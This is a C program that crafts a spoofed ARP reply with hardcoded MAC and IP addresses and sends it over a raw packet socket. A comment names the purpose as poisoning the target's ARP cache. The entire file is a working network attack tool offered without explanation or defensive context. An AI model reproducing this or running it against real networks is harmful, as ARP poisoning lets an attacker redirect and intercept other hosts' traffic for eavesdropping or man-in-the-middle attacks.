#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <netpacket/packet.h>

//define arp packet
struct aether_arp
{
    struct arphdr ea_hdr;//
    u_int8_t arp_sha[ETH_ALEN];//sender hardward address
    u_int8_t arp_spa[4];//sender protocol address
    u_int8_t arp_tha[ETH_ALEN];
    u_int8_t arp_tpa[4];//target protocol address
};
//define ether head
struct aether_header
{
    u_int8_t ether_dhost[ETH_ALEN];      // destination eth addr 
    u_int8_t ether_shost[ETH_ALEN];      // source ether addr    
    u_int16_t ether_type;                 // packet type ID field 
}; 
//const itmes

const char INTERFACE[] = "eth1";
const u_char dst_mac[]={0x00,0x0c,0x29,0x20,0x32,0xdf};//destinaition mac address
const u_char src_mac[]={0x00,0x0C,0x29,0x7a,0x32,0xfd};//source  mac address
const u_char dst_ip[]={10,0,0,2};//destination ip
const u_char src_ip[]={10,0,0,1};//source ip

//main function

int main(int argc,char **argv)
{
    int soc;
    u_char frame[42];//total length of ethernet head plus arp packet is 42 bytes

    //create socket 
    soc=socket(AF_PACKET,SOCK_RAW,htons(0x0806));//0x0806 == ETH_P_ARP
    if(soc==-1)
    {
        perror("socket error\n");
        exit(EXIT_FAILURE);
    }
    printf("socket created \n");

    struct aether_header ehead;
    struct aether_arp earp;
//填充以太网头部
    memcpy(ehead.ether_dhost,dst_mac,ETHER_ADDR_LEN);
    memcpy(ehead.ether_shost,src_mac,ETHER_ADDR_LEN);
    ehead.ether_type=htons(ETHERTYPE_ARP);

//  resolution ether hard address to ip protocol
//初始化 arp 数据包
    earp.arp_hrd=htons(ARPHRD_ETHER);   //resolution ether hard addersss
    earp.arp_pro= htons(ETHERTYPE_IP);  //resolution IP protocol
    earp.arp_hln=ETHER_ADDR_LEN;        //hard address len
    earp.arp_pln=4;                     //protocol address len
    earp.arp_op=htons(ARPOP_REPLY);     //arp operate code
    
    //填充arp包

    memcpy(earp.arp_sha,src_mac,ETHER_ADDR_LEN);
    memcpy(earp.arp_spa,src_ip,4);
    memcpy(earp.arp_tha,dst_mac,ETHER_ADDR_LEN);
    memcpy(earp.arp_tpa,dst_ip,4);
    //
    memcpy(frame,&ehead,sizeof(ehead));
    memcpy(frame+sizeof(ehead),&earp,sizeof(earp));
    printf("Arp frame created \n");
    
    //get network interfache
    struct sockaddr_ll destaddr;
    destaddr.sll_family=AF_PACKET;
    if((destaddr.sll_ifindex=if_nametoindex(INTERFACE))==0)
    {
        perror("if_nametoindex() error \n");
        exit(EXIT_FAILURE);
    }
    destaddr.sll_halen=htons(ETHER_ADDR_LEN);
    printf("struct sockaddr_all destaddr read.\n");

    //send packet to poison
    
    if(sendto(soc,frame,sizeof(frame),0,(struct sockaddr*)&destaddr,sizeof(destaddr))==-1)
    {
        perror("sendto error \n");
        exit(EXIT_FAILURE);
    }
    
    //close socket
    close(soc);
    
    printf("socket closed \n");
    
    return 0;
}

